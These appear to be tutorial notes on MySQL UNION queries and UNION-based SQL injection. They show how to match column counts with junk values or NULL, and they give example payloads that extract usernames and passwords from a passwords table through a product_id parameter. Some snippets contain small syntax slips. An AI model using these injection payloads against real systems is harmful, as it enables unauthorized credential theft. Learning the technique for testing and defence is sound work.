## Union
* Used to combine results from multiple `SELECT` statements
* Allows us to `SELECT` and dump data from all across the DBMS, from multiple tables and databases

```sql
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
```

```sql
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
```

```sql
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
```

**Note**: The data types of the selected columns on all positions should be the same.

## Even Columns
* `UNION` statement can only operate on `SELECT` statements with an equal number of columns
* If we attempt to `UNION` two queries that have results with a different number of columns, we get the following error

```sql
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

* Errors because the first `SELECT` returns one column and the second `SELECT` returns two

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

* Query would return `username` and `password` entries from the `passwords` table, assuming the `products` table has two columns

## Uneven Columns
* If we `UNION` with the string `"junk"`, the `SELECT` query would be `SELECT "junk" from passwords` which will always return `junk` or `SELECT 1 from passwords` will always return `1` as the output

**Note**: When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.

**Tip**: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

*  The `products` table has two columns in the above example, so we have to `UNION` with two columns
* If we only wanted to get one column 'e.g. `username`', we have to do `username, 2`, where the `2` stands for junk data

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

* If we have more columns

```sql
UNION SELECT username, 2, 3, 4, from passwords-- '
```

```sql
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```